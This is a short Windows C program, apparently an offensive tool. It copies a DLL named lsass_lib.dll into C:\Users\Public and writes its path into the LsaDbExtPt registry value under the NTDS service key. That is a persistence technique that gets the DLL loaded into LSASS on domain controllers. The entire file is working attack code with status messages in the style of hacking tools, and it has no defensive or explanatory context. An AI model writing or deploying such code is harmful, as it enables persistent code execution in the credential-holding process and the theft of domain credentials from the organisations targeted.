#include <windows.h>
#include <stdio.h>

int main() {
    HKEY hKey;
    LPCSTR subKey = "SYSTEM\\CurrentControlSet\\Services\\NTDS";
    LPCSTR valueName = "LsaDbExtPt";
    LPCSTR dllPath = "C:\\Users\\Public\\lsass_lib.dll";

    const char* srcPath = "lsass_lib.dll";
    const char* dstPath = "C:\\Users\\Public\\lsass_lib.dll";

    if (!CopyFileA(srcPath, dstPath, FALSE)) {
        printf("[-] Failed to copy file to C:\\Users\\Public\\lsass_lib.dll. Error: %lu\n", GetLastError());
        return 1;
    } else {
        printf("[+] Successfully copied DLL to C:\\Users\\Public\\lsass_lib.dll. \n");
    }


    LONG result = RegOpenKeyExA(HKEY_LOCAL_MACHINE, subKey, 0, KEY_SET_VALUE, &hKey);
    if (result != ERROR_SUCCESS) {
        printf("[-] Failed to open registry key: %ld\n", result);
        return 1;
    }

    result = RegSetValueExA(hKey, valueName, 0, REG_SZ, (const BYTE*)dllPath, strlen(dllPath) + 1);
    if (result != ERROR_SUCCESS) {
        printf("[-] Failed to set registry value: %ld\n", result);
        RegCloseKey(hKey);
        return 1;
    }

    printf("[+] Registry value '%s' set to '%s'\n", valueName, dllPath);
    RegCloseKey(hKey);
    return 0;
}
